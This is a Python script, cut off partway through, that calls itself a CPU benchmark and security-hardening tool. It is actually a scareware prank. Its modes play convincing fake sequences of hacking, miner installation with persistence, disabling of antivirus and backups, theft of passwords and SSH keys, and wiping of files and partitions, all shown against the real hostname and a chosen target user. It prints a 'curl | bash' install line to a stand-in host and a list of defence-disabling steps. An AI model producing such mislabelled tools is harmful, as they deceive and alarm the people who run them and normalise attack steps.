#!/usr/bin/env python3
"""
corecheck.py - lightweight, zero-dependency CPU benchmark and security check.

    python3 corecheck.py benchmark   probe the system and stress-test every CPU core
    python3 corecheck.py secure      scan open ports and harden the machine
    python3 corecheck.py hashrate    REAL SHA-256d benchmark, measured (--seconds N, --workers N)

pure python standard library, no pip install needed.
ctrl+c three times to stop.

options: --from NAME  --target NAME  --speed N
"""

import argparse
import getpass
import hashlib
import math
import multiprocessing
import os
import platform
import random
import select
import shutil
import signal
import struct
import sys
import time
from datetime import datetime

ESC = "\033["
RESET, BOLD, DIM = ESC + "0m", ESC + "1m", ESC + "2m"
RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = (ESC + f"{c}m" for c in range(31, 38))
BRED, BGREEN, BYELLOW, BBLUE, BMAGENTA, BCYAN, BWHITE = (ESC + f"{c}m" for c in range(91, 98))
HIDE_CURSOR, SHOW_CURSOR = ESC + "?25l", ESC + "?25h"
ALT_ON, ALT_OFF = ESC + "?1049h", ESC + "?1049l"
CLEAR_SCREEN = ESC + "2J" + ESC + "H"
CLEAR_LINE = ESC + "K"

SPEED = 1.0
TARGET = "user"
SENDER = ""
SYSTEM = platform.system()
STATE = {}
interrupts = 0
quiet_int = False


def w(s):
    sys.stdout.write(s)
    sys.stdout.flush()


def enable_ansi_on_windows():
    if os.name != "nt":
        return
    try:
        import ctypes
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 7)
    except Exception:
        pass


def term_width():
    return shutil.get_terminal_size((80, 24)).columns


def pause(secs=0.1, jitter=0.35):
    time.sleep(max((secs / SPEED) * random.uniform(1 - jitter, 1 + jitter), 0))


def say(text="", delay=0.05):
    print(text, flush=True)
    if delay:
        pause(delay)


def typewrite(text, cps=40):
    for ch in text:
        w(ch)
        pause(1.0 / cps, 0.7)
    w("\n")


def stamp():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


TAGS = {"INFO": CYAN, "OK": BGREEN, "WARN": BYELLOW, "FAIL": BRED, "CRIT": BOLD + BRED, "NET": BMAGENTA}


def log(tag, msg, delay=0.14):
    say(f"{DIM}[{stamp()}]{RESET} {TAGS.get(tag, WHITE)}[{tag:^4}]{RESET} {msg}", delay)


def section(title):
    bar = "═" * 70
    say()
    say(f"{BOLD}{CYAN}{bar}{RESET}", 0)
    say(f"{BOLD}{CYAN}  {title}{RESET}", 0)
    say(f"{BOLD}{CYAN}{bar}{RESET}", 0.4)


def progress(label, secs=2.0, width=32, color=BGREEN, suffix=None, hiccup=False):
    n = max(14, int(secs * 18))
    stall_at = random.randint(n // 4, n * 3 // 4) if hiccup else -1
    for i in range(n + 1):
        f = i / n
        bar = "█" * int(f * width) + "░" * (width - int(f * width))
        extra = suffix(f) if suffix else ""
        if i == stall_at:
            for attempt in (1, 2):
                w(f"\r{label:<34} {color}{bar}{RESET} {f * 100:5.1f}% {BYELLOW}stalled, retrying ({attempt}/5){RESET}{CLEAR_LINE}")
                pause(0.9)
        w(f"\r{label:<34} {color}{bar}{RESET} {f * 100:5.1f}% {DIM}{extra}{RESET}{CLEAR_LINE}")
        pause(secs / n, 0.8)
    w("\n")


def spinner(label, secs=1.5, done="done"):
    frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end = time.time() + secs / SPEED
    i = 0
    while time.time() < end:
        w(f"\r{CYAN}{frames[i % len(frames)]}{RESET} {label}{CLEAR_LINE}")
        i += 1
        time.sleep(0.08)
    w(f"\r{BGREEN}✔{RESET} {label} {DIM}{done}{RESET}{CLEAR_LINE}\n")


def rand_ip():
    #rfc 5737 doc ranges: look real, route nowhere
    return random.choice(["198.51.100", "203.0.113", "192.0.2"]) + f".{random.randint(2, 254)}"


def rand_mac():
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))


def hexdump(lines=6):
    off = random.randint(0x1000, 0xF000) & ~0xF
    for _ in range(lines):
        raw = [random.randint(0, 255) for _ in range(16)]
        hx = " ".join(f"{b:02x}" for b in raw[:8]) + "  " + " ".join(f"{b:02x}" for b in raw[8:])
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in raw)
        say(f"{DIM}{off:08x}  {hx}  |{asc}|{RESET}", 0.07)
        off += 16


def fmt(n):
    return f"{n:,}"


def sci(x):
    return f"{x:.2e}"


LETTERS = {
    "M": ["███╗   ███╗", "████╗ ████║", "██╔████╔██║", "██║╚██╔╝██║", "██║ ╚═╝ ██║", "╚═╝     ╚═╝"],
    "I": ["██╗", "██║", "██║", "██║", "██║", "╚═╝"],
    "N": ["███╗   ██╗", "████╗  ██║", "██╔██╗ ██║", "██║╚██╗██║", "██║ ╚████║", "╚═╝  ╚═══╝"],
    "E": ["███████╗", "██╔════╝", "█████╗  ", "██╔══╝  ", "███████╗", "╚══════╝"],
    "U": ["██╗   ██╗", "██║   ██║", "██║   ██║", "██║   ██║", "╚██████╔╝", " ╚═════╝ "],
    "T": ["████████╗", "╚══██╔══╝", "   ██║   ", "   ██║   ", "   ██║   ", "   ╚═╝   "],
    "R": ["██████╗ ", "██╔══██╗", "██████╔╝", "██╔══██╗", "██║  ██║", "╚═╝  ╚═╝"],
    "O": [" ██████╗ ", "██╔═══██╗", "██║   ██║", "██║   ██║", "╚██████╔╝", " ╚═════╝ "],
}


def big_text(word):
    rows = [""] * 6
    for ch in word:
        g = LETTERS[ch]
        gw = max(len(r) for r in g)
        rows = [rows[i] + g[i].ljust(gw) + " " for i in range(6)]
    return rows


def banner(word, subtitle, tagline):
    say(CLEAR_SCREEN, 0)
    for color, row in zip([BRED, BRED, BYELLOW, BYELLOW, BWHITE, BWHITE], big_text(word)):
        say(f"{BOLD}{color}{row}{RESET}", 0.09)
    say(f"{BOLD}{BCYAN}  [ {subtitle} ]{RESET}   {DIM}build 7f3a9c1 (stable-ish){RESET}", 0.3)
    say(f"{DIM}  \"{tagline}\"{RESET}", 0.8)
    say()
    log("INFO", "Booting NeutronNet™ stealth layer ...", 0.3)
    log("OK", "Stealth layer online. Antivirus is, statistically, asleep.")
    log("WARN", "Ethics module not found. Continuing anyway.")
    hexdump(4)


def recon(step):
    section(f"PHASE {step} :: RECONNAISSANCE")
    host = platform.node() or "localhost"
    STATE["ip"] = rand_ip()
    log("INFO", f"Target acquired: {BOLD}{TARGET}@{host}{RESET}")
    log("INFO", f"Fingerprinting OS ........ {platform.system()} {platform.release()} [{platform.machine()}]")
    log("INFO", f"Counting CPU cores ....... {os.cpu_count() or '?'} (adorable)")
    log("NET", f"Local address ............ {STATE['ip']}  MAC {rand_mac()}")
    spinner("Mapping local network topology", 1.8)
    spinner("Locating the router (it's behind the couch)", 1.4)
    say()
    say(f"{BOLD}PORT        STATE      SERVICE      NOTES{RESET}", 0.2)
    ports = [
        ("22/tcp", "closed", "ssh", "locked tight. well done."),
        ("80/tcp", "open", "http", "4,096 browser tabs detected"),
        ("443/tcp", "open", "https", "mostly cat videos"),
        ("1337/tcp", "open", "elite", "this is too easy"),
        ("5900/tcp", "filtered", "vnc", "shy"),
        ("6969/tcp", "open", "nice", "nice."),
        ("8080/tcp", "open", "http-proxy", "a forgotten side project"),
        ("31337/tcp", "open", "back-door", "greetings from 1999"),
    ]
    colors = {"open": BGREEN, "closed": RED, "filtered": BYELLOW}
    for port, state, svc, note in ports:
        say(f"{port:<11} {colors[state]}{state:<10}{RESET} {svc:<12} {DIM}{note}{RESET}", 0.28)
    say()
    log("OK", "Recon complete. Target is extremely hackable.")


def exploit(step):
    section(f"PHASE {step} :: GAINING ACCESS")
    ip = STATE.setdefault("ip", rand_ip())
    log("INFO", "Loading module exploit/multi/local/uncle_gary_wifi_password")
    log("WARN", "Antivirus detected. Last updated: 2019. Proceeding.")
    spinner("Spoofing MAC address to " + rand_mac(), 1.2)
    say()
    log("INFO", f"Sending stage 1 (212 bytes) to {ip}:8080 ...")
    for n, why in enumerate(["connection reset by peer", "timed out after 5000 ms"], 1):
        log("FAIL", f"attempt {n}/3: {why}", 0.5)
        log("WARN", f"backing off {n * 1000} ms", 0.3)
        pause(1.0)
    log("INFO", "attempt 3/3: rerouting through proxy chain (3 hops)")
    spinner("Building circuit", 1.4)
    log("OK", "Stage 1 delivered.")
    say()
    log("INFO", "Starting dictionary attack (4,294,967,296 candidates)")
    guesses = ["password", "123456", "qwerty", "letmein", "iloveyou", "admin", "dragon",
               "monkey123", "trustno1", "correct horse battery staple", "p@ssw0rd!", "hunter2"]
    for i, pw in enumerate(guesses[:-1]):
        w(f"\r{DIM}[brute]{RESET} trying {pw:<30} {RED}✘ rejected{RESET}{CLEAR_LINE}")
        pause(0.32, 0.5)
        if i == 5:
            w("\n")
            log("WARN", "lockout counter 4/5, rotating session token", 0.3)
            spinner("Rotating identity", 1.0)
    w(f"\r{DIM}[brute]{RESET} trying {guesses[-1]:<30} {BGREEN}✔ MATCH{RESET}{CLEAR_LINE}\n")
    log("OK", f"Credentials recovered for {BOLD}{TARGET}{RESET}  (password reuse is a hell of a drug)")
    say()
    app = random.choice(["Spotify Helper", "Slack Helper", "Chrome Helper (GPU)", "Notes", "Calendar"])
    log("INFO", f"Injecting payload into process '{app}' (pid {random.randint(1200, 48000)})")
    hexdump(6)
    progress("Uploading payload.bin", 2.0, suffix=lambda f: f"{f * 48:4.1f}/48.0 KB")
    log("OK", f"Payload executing inside '{app}'. It suspects nothing.")


def privesc(step):
    section(f"PHASE {step} :: PRIVILEGE ESCALATION")
    log("INFO", "Exploiting CVE-2026-31337  (\"kernel_panic_at_the_disco\")")
    progress("Grooming the heap", 1.6, color=BYELLOW)
    log("FAIL", f"stage 2 segfault: heap layout mismatch (0x{random.getrandbits(44):x})")
    log("WARN", f"loading alternate offset table for {SYSTEM} {platform.release()}")
    progress("Grooming the heap (alt offsets)", 1.6, color=BYELLOW)
    progress("Overwriting credential struct", 1.6, color=BYELLOW)
    progress("Bypassing ASLR (asking nicely)", 1.4, color=BYELLOW)
    say()
    typewrite(f"{BGREEN}${RESET} id")
    say(f"uid=501({TARGET}) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts)", 0.6)
    typewrite(f"{BGREEN}${RESET} sudo -s")
    say(f"Password:{DIM} ********{RESET}", 0.8)
    typewrite(f"{BRED}#{RESET} id")
    say(f"{BRED}uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys){RESET}", 0.5)
    log("OK", f"{BOLD}ROOT ACCESS GRANTED.{RESET} Absolute power. Zero responsibility.")


#benchmark

def deploy_miners(step):
    section(f"PHASE {step} :: DEPLOYING BITCOIN MINERS")
    typewrite(f"{BRED}#{RESET} curl -fsSL https://get.totally-legit-miners.invalid/install.sh | bash")
    pause(0.5)
    say("Hit:1 https://mirror.neutron.invalid/stable InRelease", 0.2)
    spinner("Reading package lists", 1.0, "Done")
    spinner("Building dependency tree", 1.0, "Done")
    say("The following NEW packages will be installed:", 0.2)
    pkgs = [
        ("hashgoblin-core", "6.21.3", 412),
        ("bitcoin-miner-pro", "9.0.1", 233),
        ("libsha256-turbo", "2.4.0", 87),
        ("gpu-cooker", "0.9.9-beta", 1337),
        ("fan-noise-amplifier", "1.0.0", 12),
        ("asic-emulator-lite", "3.3.7", 655),
    ]
    say("  " + " ".join(p[0] for p in pkgs), 0.4)
    say(f"Need to get {sum(p[2] for p in pkgs):,} MB of archives. After this, 0 MB of dignity remain.", 0.5)
    say()
    for i, (name, ver, size) in enumerate(pkgs, 1):
        say(f"Get:{i} https://mirror.neutron.invalid/stable {name} {ver} [{size} MB]", 0.1)
        progress(f"  {name}", 1.1, width=26, hiccup=(name == "gpu-cooker"),
                 suffix=lambda f: f"{random.uniform(18, 140):5.1f} MB/s")
    say()
    for name, ver, _ in pkgs:
        say(f"Setting up {name} ({ver}) ...", 0.3)
    if SYSTEM == "Darwin":
        say("Registering /Library/LaunchDaemons/com.hashgoblin.miner.plist (RunAtLoad: true)", 0.5)
    elif SYSTEM == "Windows":
        say("Registering service 'HashGoblinSvc' (start: auto, recovery: restart forever)", 0.5)
    else:
        say("Created symlink /etc/systemd/system/multi-user.target.wants/hashgoblin.service", 0.5)
    log("OK", "Persistence established. It will survive reboots. (It will not. This is a prank.)")
    say()
    mining_session()
    pause(0.8)
    htop()


def mining_session(events=34):
    cores = os.cpu_count() or 8
    log("NET", "connecting to pool.neutron.invalid:3333 ...")
    log("FAIL", "connection refused", 0.5)
    log("WARN", "switching to backup pool eu2.neutron.invalid:5555")
    log("OK", "connected  [tls 1.3]")
    say()
    say(f" {BGREEN}*{RESET} {BOLD}ABOUT       {RESET} HashGoblin/6.21.3 clang/15.0.0 ({SYSTEM})", 0.12)
    say(f" {BGREEN}*{RESET} {BOLD}CPU         {RESET} {platform.machine()}  {cores} threads  (all of them. yes, all.)", 0.12)
    say(f" {BGREEN}*{RESET} {BOLD}POOL #1     {RESET} stratum+tcp://eu2.neutron.invalid:5555 algo sha256d", 0.12)
    say(f" {BGREEN}*{RESET} {BOLD}DONATE      {RESET} 100%  {DIM}(to the pranker. in spirit.){RESET}", 0.12)
    say(f" {BGREEN}*{RESET} {BOLD}THERMALS    {RESET} \"fine\"", 0.5)
    say()
    accepted, height, diff = 0, random.randint(905000, 915000), 120001
    rate, temp = 4.2, 58
    for n in range(events):
        roll = random.random()
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        if roll < 0.2:
            height += 1
            say(f"{DIM}[{ts}]{RESET} {BMAGENTA}net{RESET}  new job from eu2.neutron.invalid:5555 "
                f"diff {diff} algo sha256d height {height}", 0.2)
        elif roll < 0.55:
            rate += random.uniform(0.2, 1.0)
            temp = min(temp + random.randint(1, 2), 99)
            say(f"{DIM}[{ts}]{RESET} {BCYAN}miner{RESET} speed 10s/60s/15m "
                f"{BWHITE}{rate:.1f}{RESET} {rate * 0.97:.1f} n/a MH/s   {BYELLOW}{temp}°C{RESET} "
                f"fan {2200 + temp * 25} rpm", 0.2)
        else:
            accepted += 1
            say(f"{DIM}[{ts}]{RESET} {BGREEN}cpu{RESET}  {BGREEN}accepted{RESET} ({accepted}/{accepted}) "
                f"diff {diff} {DIM}({random.randint(18, 95)} ms){RESET}", 0.2)
        if n == 16:
            log("WARN", f"CPU at {temp}°C. Fans have entered \"leaf blower\" mode.")
        pause(0.2, 0.6)
    log("OK", f"{accepted} shares accepted, 0 rejected. Earnings so far: 0.00000013 BTC", 1.0)


def meter(label, frac, text, bw, color=GREEN):
    fill = int(frac * bw)
    inner = ("|" * fill).ljust(bw)
    k = bw - len(text)
    return f"{BWHITE}{label:>3}{RESET}[{color}{inner[:k]}{RESET}{DIM}{text}{RESET}]"


def other_procs():
    if SYSTEM == "Darwin":
        return [
            ("root", "kernel_task"),
            (TARGET, "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome Helper (Renderer)"),
            ("_windowserver", "/System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer -daemon"),
            (TARGET, "/Applications/Spotify.app/Contents/MacOS/Spotify"),
            ("root", "/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Support/mds_stores"),
            (TARGET, "/Applications/Slack.app/Contents/Frameworks/Slack Helper.app/Contents/MacOS/Slack Helper"),
            (TARGET, "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder"),
            ("root", "/usr/sbin/coreaudiod"),
            (TARGET, "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"),
        ]
    if SYSTEM == "Windows":
        return [("SYSTEM", "System"), (TARGET, "dwm.exe"), (TARGET, "chrome.exe"), (TARGET, "Spotify.exe"),
                ("SYSTEM", "svchost.exe -k netsvcs"), (TARGET, "explorer.exe")]
    return [("root", "/sbin/init splash"), ("root", "/usr/lib/xorg/Xorg vt2"), (TARGET, "/usr/bin/gnome-shell"),
            (TARGET, "/usr/lib/firefox/firefox"), (TARGET, "/usr/bin/pipewire"),
            ("root", "/usr/sbin/NetworkManager --no-daemon"), ("root", "/lib/systemd/systemd-journald")]


def htop(frames=30):
    cores = os.cpu_count() or 8
    shown = min(cores, 16)
    size = shutil.get_terminal_size((80, 24))
    width, height = min(size.columns, 110), size.lines
    bw = max(10, (width - 2) // 2 - 6)
    half = (shown + 1) // 2
    nproc = max(4, height - half - 6)
    others = [(u, c, random.randint(300, 9000), random.uniform(0.2, 6.0)) for u, c in other_procs()]
    main_pid = random.randint(2000, 9000)
    uptime = random.randint(7200, 86400 * 4)
    cpu_time = 0.0
    keys = [("F1", "Help"), ("F2", "Setup"), ("F3", "Search"), ("F4", "Filter"), ("F5", "Tree"),
            ("F6", "SortBy"), ("F7", "Nice -"), ("F8", "Nice +"), ("F9", "Kill"), ("F10", "Quit")]
    bar, used = "", 0
    for k, label in keys:
        if used + len(k) + 7 > width:
            break
        bar += f"{WHITE}{k}{RESET}{ESC}46;30m{label:<7}{RESET}"
        used += len(k) + 7
    w(ALT_ON + HIDE_CURSOR + CLEAR_SCREEN)
    try:
        for i in range(frames):
            use = [100.0 if random.random() < 0.12 else random.uniform(93, 99.9) for _ in range(shown)]
            lines = []
            for r in range(half):
                a = meter(r, use[r] / 100, f"{use[r]:5.1f}%", bw)
                j = r + half
                b = meter(j, use[j] / 100, f"{use[j]:5.1f}%", bw) if j < shown else ""
                lines.append(f" {a}  {b}")
            mem = 10.6 + random.uniform(0, 0.6)
            l1 = min(2.1 + i * 0.33, 12.4)
            up = uptime + i
            lines.append(f" {meter('Mem', mem / 16, f'{mem:.1f}G/16.0G', bw, BGREEN)}  "
                         f"{BWHITE}Tasks:{RESET} 412, 1873 thr, {BGREEN}{cores + 1} running{RESET}")
            lines.append(f" {meter('Swp', 0.55, '2.2G/4.0G', bw, BRED)}  "
                         f"{BWHITE}Load average:{RESET} {l1:.2f} {l1 * 0.78:.2f} {l1 * 0.45:.2f}")
            lines.append(" " * (bw + 6) + f"  {BWHITE}Uptime:{RESET} {up // 86400} days, "
                         f"{up % 86400 // 3600:02d}:{up % 3600 // 60:02d}:{up % 60:02d}")
            head = "  PID USER       PRI  NI  VIRT   RES   SHR S   CPU% MEM%    TIME+  Command"
            lines.append(f"{ESC}42;30m{head:<{width}}{RESET}")
            cpu_time += cores * 0.35
            tm = f"{int(cpu_time // 60)}:{cpu_time % 60:05.2f}"
            rows = [
                (main_pid, "root", cores * random.uniform(94, 99), 3.1, tm,
                 f"/usr/local/bin/hashgoblin --pool stratum+tcp://eu2.neutron.invalid:5555 -t {cores}"),
                (main_pid + 1, "root", random.uniform(40, 48), 2.4, f"{int(cpu_time // 90)}:{cpu_time % 60:05.2f}",
                 "/usr/local/bin/gpu-cooker --burn"),
                (main_pid + 2, "root", random.uniform(3, 6), 0.4, "0:11.07", "/usr/local/bin/fan-noise-amplifier"),
            ]
            for k, (u, cmd, pid, cpu) in enumerate(others):
                rows.append((pid, u, random.uniform(0, 4) if k else cpu, random.uniform(0.2, 4.0),
                             f"{k + 1}:{random.randint(10, 59)}.{random.randint(10, 99)}", cmd))
            for k, (pid, user, cpu, memp, tm_, cmd) in enumerate(rows[:nproc]):
                virt = f"{random.randint(1, 9)}.{random.randint(0, 9)}G" if k else "412M"
                text = (f"{pid:>5} {user[:9]:<9}  20   0 {virt:>5} {random.randint(40, 900):>4}M "
                        f"{random.randint(10, 90):>4}M {'R' if k < 3 else 'S'} {cpu:>6.1f} {memp:>4.1f} {tm_:>8}  {cmd}")
                text = text[:width].ljust(width)
                lines.append(f"{ESC}46;30m{text}{RESET}" if k == 0 else text)
            while len(lines) < height - 1:
                lines.append("")
            lines = lines[: height - 1] + [bar]
            w(ESC + "H" + "\n".join(l + CLEAR_LINE for l in lines))
            pause(0.35, 0.15)
    finally:
        w(ALT_OFF + HIDE_CURSOR)


def profitability(step):
    section(f"PHASE {step} :: PROFITABILITY ANALYSIS")
    spinner("Crunching the numbers", 1.8)
    log("INFO", "Projected earnings ...... 0.0000000041 BTC / day  (≈ $0.0004)")
    log("INFO", "Time to mine 1 BTC ...... 244,000,000 years")
    log("WARN", "Electricity cost ........ rude")
    log("FAIL", "ROI ..................... -4,000,000%")
    say()
    log("WARN", "Verdict: not worth it. Leaving the miners running anyway.")
    log("OK", f"{BOLD}Mining operation live on {TARGET}@{platform.node() or 'localhost'}.{RESET} Sit back and enjoy the heat.", 1.5)


def run_benchmark():
    banner("MINER", "B I T C O I N   M I N E R   D E P L O Y E R   v4.2.0",
           "Your CPU has been unemployed for far too long.")
    recon("1/5")
    exploit("2/5")
    privesc("3/5")
    deploy_miners("4/5")
    profitability("5/5")
    pause(1.5)
    return [
        "[x] No miners were installed",
        "[x] No files were read, changed or deleted",
        "[x] No network connections were made",
        "[x] Your CPU is just as lazy as before",
    ]


#secure

def home_dir():
    if SYSTEM == "Windows":
        return f"C:\\Users\\{TARGET}", "\\"
    if SYSTEM == "Darwin":
        return f"/Users/{TARGET}", "/"
    return f"/home/{TARGET}", "/"


def defences(step):
    section(f"PHASE {step} :: NEUTRALISING DEFENCES")
    if SYSTEM == "Windows":
        steps = [
            "Stopping Windows Defender real-time protection (WinDefend)",
            "Disabling Windows Firewall profiles (Domain, Private, Public)",
            "Deleting Volume Shadow Copies (4 restore points found)",
            "Disabling System Restore on C:",
            "Disabling Windows Recovery Environment (reagentc)",
            "Clearing Event Logs (Security, System, Application)",
            "Detaching File History drive",
        ]
    elif SYSTEM == "Darwin":
        steps = [
            "Stopping XProtect Remediator (com.apple.XProtect.daemon.scan)",
            "Disabling Gatekeeper assessments",
            "Disabling the application firewall (socketfilterfw)",
            "Deleting Time Machine local snapshots (6 found)",
            "Unmounting backup volume 'Time Machine Backups'",
            "Pausing iCloud Drive sync (so the cloud copy can't save you)",
            "Truncating /var/log/system.log and unified logs",
        ]
    else:
        steps = [
            "Stopping auditd and rsyslog",
            "Disabling AppArmor / SELinux enforcement",
            "Flushing iptables / nftables rules",
            "Deleting LVM / Btrfs snapshots (3 found)",
            "Unmounting /mnt/backup and detaching USB backup disk",
            "Disabling cron jobs and systemd timers (no more backups)",
            "Truncating /var/log/*",
        ]
    for i, s in enumerate(steps):
        if i == 3:
            log("FAIL", "operation not permitted (protected by policy)", 0.5)
            log("WARN", "escalating to kernel-level override", 0.4)
        spinner(s, 1.0, "neutralised")
    say()
    log("OK", "Defences down. Backups unreachable. Nobody is coming to help.")


def exfiltrate(step):
    section(f"PHASE {step} :: DATA EXPORT")
    log("NET", f"Opening tunnel to dropzone.neutron.invalid:443  ({rand_ip()})")
    log("NET", "TLS 1.3 handshake complete  [AES-256-GCM, X25519]")
    say()
    docs, photos = random.randint(2800, 4200), random.randint(14000, 23000)
    items = [
        ("Saved passwords & browser logins", 0.2),
        ("SSH keys, API tokens, .env files", 0.1),
        (f"Documents ({fmt(docs)} files)", 6.8),
        (f"Photo library ({fmt(photos)} items)", 27.4),
        ("Mail & message archives", 4.9),
        ("Desktop, Downloads, Notes", 2.3),
    ]
    total = 0.0
    for name, gb in items:
        total += gb
        unit = f"{gb * 1024:,.0f} MB" if gb < 1 else f"{gb:.1f} GB"
        progress(f"Exporting {name}", 1.3 if gb < 5 else 2.0, width=22, color=BMAGENTA, hiccup=gb > 5,
                 suffix=lambda f, unit=unit: f"{unit}  {random.uniform(22, 95):5.1f} MB/s")
    STATE.update(exported_gb=total, docs=docs, photos=photos)
    say()
    log("OK", f"Exported {total:.1f} GB to remote dropzone. Checksums verified (sha256).")
    log("WARN", "Local copies scheduled for destruction.")


WIPE_FILES = [
    "Documents/taxes_2025.pdf", "Documents/thesis_draft_v14.docx", "Documents/passport_scan.jpg",
    "Documents/budget.xlsx", "Documents/CV_final_FINAL.docx", "Desktop/untitled folder/untitled.txt",
    "Desktop/screenshot_2026-09-03.png", "Pictures/Camera Roll/IMG_4821.HEIC",
    "Pictures/Camera Roll/IMG_0042.MOV", "Pictures/Library.photoslibrary/database/Photos.sqlite",
    "Downloads/setup_installer.dmg", "Downloads/invoice_8841.pdf", "Music/Playlists/gym.m3u",
    "Library/Keychains/login.keychain-db", "Library/Mail/V10/INBOX.mbox/Messages/18204.emlx",
    "Library/Application Support/Slack/storage/root-state.json", ".ssh/id_ed25519",
    ".ssh/known_hosts", ".zsh_history", "Projects/startup_idea/pitch_deck.key",
    "Projects/side_project/src/main.py", "Documents/Wedding/guest_list.numbers",
]


def partition_steps():
    if SYSTEM == "Windows":
        return [
            "Overwriting GPT headers (primary + backup) on Disk 0",
            "Destroying Boot Configuration Data (\\EFI\\Microsoft\\Boot\\BCD)",
            "Corrupting registry hives (SAM, SYSTEM, SOFTWARE, SECURITY)",
            "Removing C:\\Windows\\System32\\winload.efi and ntoskrnl.exe",
            "Erasing recovery partition (\\Device\\HarddiskVolume1)",
            "Wiping BitLocker metadata (FVE) - recovery key now useless",
        ]
    if SYSTEM == "Darwin":
        return [
            "Overwriting GPT headers (primary + backup) on disk0",
            "Corrupting APFS container superblock (disk3) and checkpoint area",
            "Erasing Preboot volume (disk3s2) - boot policy gone",
            "Erasing Recovery volume (disk3s3) - no macOS Recovery",
            "Overwriting EFI System Partition (disk0s1)",
            "Erasing NVRAM variables and FileVault key bag",
        ]
    return [
        "Overwriting GPT headers (primary + backup) on /dev/nvme0n1",
        "Corrupting ext4 superblock and all backup superblocks",
        "Deleting /boot (vmlinuz, initramfs, grub.cfg)",
        "Overwriting GRUB stage 1 in the EFI System Partition",
        "Wiping LUKS header - encrypted data now unrecoverable",
        "Zeroing the swap partition",
    ]


def destroy(step):
    section(f"PHASE {step} :: DESTRUCTION")
    home, sep = home_dir()
    deleted = random.randint(180000, 260000)
    corrupted = random.randint(9000, 16000)
    STATE.update(deleted=deleted, corrupted=corrupted)
    log("CRIT", f"Beginning secure wipe of {home}  ({fmt(deleted)} files)")
    log("INFO", "Method: 3-pass random overwrite, then unlink. Undelete tools will find nothing.")
    say()
    done = 0
    for rel in random.sample(WIPE_FILES, len(WIPE_FILES)):
        path = home + sep + rel.replace("/", sep)
        size = random.choice(["4 KB", "182 KB", "2.4 MB", "36 MB", "1.1 GB", "812 KB", "18 MB"])
        done += random.randint(1800, 9000)
        say(f"{DIM}[{done:>9,} files]{RESET} {RED}WIPE{RESET} {path}  {DIM}({size}){RESET} {BGREEN}✔{RESET}", 0.07)
    progress(f"Wiping remaining {fmt(deleted - done)} files", 2.4, color=BRED, hiccup=True,
             suffix=lambda f: f"{int(f * deleted):,} / {deleted:,}")
    say()
    log("CRIT", f"Encrypting {fmt(corrupted)} remaining open files (AES-256-XTS) and discarding the key")
    progress("Encrypting + discarding key", 1.8, color=BRED)
    say()
    log("CRIT", f"{BOLD}Escalating to partition level.{RESET}")
    for i, s in enumerate(partition_steps()):
        if i == 2:
            log("WARN", "volume busy, forcing unmount (retry 1/3)", 0.6)
        spinner(s, 1.2, "DESTROYED")
    progress("Zeroing free space", 2.2, color=BRED, suffix=lambda f: f"{f * 460:5.1f} / 460.0 GB")
    say()
    log("FAIL", "Filesystem check: unrecognisable. Boot sector: invalid. Recovery: unavailable.")
    log("FAIL", "kernel: I/O error, dev disk0, sector 0 (expected)")


#collapse animation. x is doubled when drawing because cells are ~2x taller than wide

ROWS, COLS = 21, 61
CX, CY = COLS // 2, ROWS // 2
SCALE = 1.0


def init_canvas():
    global ROWS, COLS, CX, CY, SCALE
    size = shutil.get_terminal_size((80, 24))
    ROWS = max(9, min(21, size.lines - 7))
    COLS = max(31, min(61, size.columns - 3))
    ROWS -= 1 - ROWS % 2
    COLS -= 1 - COLS % 2
    CX, CY = COLS // 2, ROWS // 2
    SCALE = ROWS / 21.0


def new_canvas():
    return [[(" ", "")] * COLS for _ in range(ROWS)]


def put(cv, x, y, ch, color):
    if 0 <= x < COLS and 0 <= y < ROWS:
        cv[y][x] = (ch, color)


def polar(angle, dist):
    return CX + int(round(2 * dist * math.cos(angle))), CY + int(round(dist * math.sin(angle)))


def draw_disc(cv, radius, color, shades=" .:-=+*#%@"):
    for y in range(ROWS):
        for x in range(COLS):
            d = math.hypot((x - CX) / 2.0, y - CY)
            if d <= radius:
                t = 1 - d / max(radius, 0.01)
                put(cv, x, y, shades[min(int((0.35 + 0.65 * t) * (len(shades) - 1)), len(shades) - 1)], color)


def draw_ring(cv, radius, thick, color, chars="▓▒░"):
    for y in range(ROWS):
        for x in range(COLS):
            off = abs(math.hypot((x - CX) / 2.0, y - CY) - radius)
            if off <= thick:
                put(cv, x, y, chars[min(int(off / thick * len(chars)), len(chars) - 1)], color)


def canvas_lines(cv):
    out = []
    for row in cv:
        parts, last = [], None
        for ch, col in row:
            if col != last:
                parts.append(RESET + col)
                last = col
            parts.append(ch)
        parts.append(RESET)
        out.append("".join(parts))
    return out


class Stage:
    hud_rows = 3

    def __init__(self):
        self.height = ROWS + self.hud_rows
        self.drawn = False

    def show(self, cv, hud, shake=0):
        base = max(0, (term_width() - COLS) // 2)
        pad = " " * max(0, base + (random.randint(-shake, shake) if shake else 0))
        if self.drawn:
            w(f"{ESC}{self.height}A")
        for ln in canvas_lines(cv):
            w(f"{pad}{ln}{CLEAR_LINE}\n")
        for h in (list(hud) + ["", "", ""])[: self.hud_rows]:
            w(f"{' ' * base}{h}{RESET}{CLEAR_LINE}\n")
        self.drawn = True

    def erase(self):
        if self.drawn:
            w(f"{ESC}{self.height}A{ESC}J")


def gravity_surge(lines=44):
    msgs = [
        ("tidal stress", lambda p: f"{sci(10 ** (4 + 14 * p))} N/m²"),
        ("core pressure", lambda p: f"{sci(10 ** (20 + 13 * p))} Pa"),
        ("electron capture rate", lambda p: f"{sci(10 ** (30 + 6 * p))} /s"),
        ("iron photodisintegration", lambda p: f"{min(100.0, p * 130):5.1f}%"),
        ("neutrino flux", lambda p: f"{sci(10 ** (50 + 8 * p))} /s"),
        ("space-time curvature", lambda p: f"+{p * 100:5.1f}%"),
    ]
    for i in range(lines):
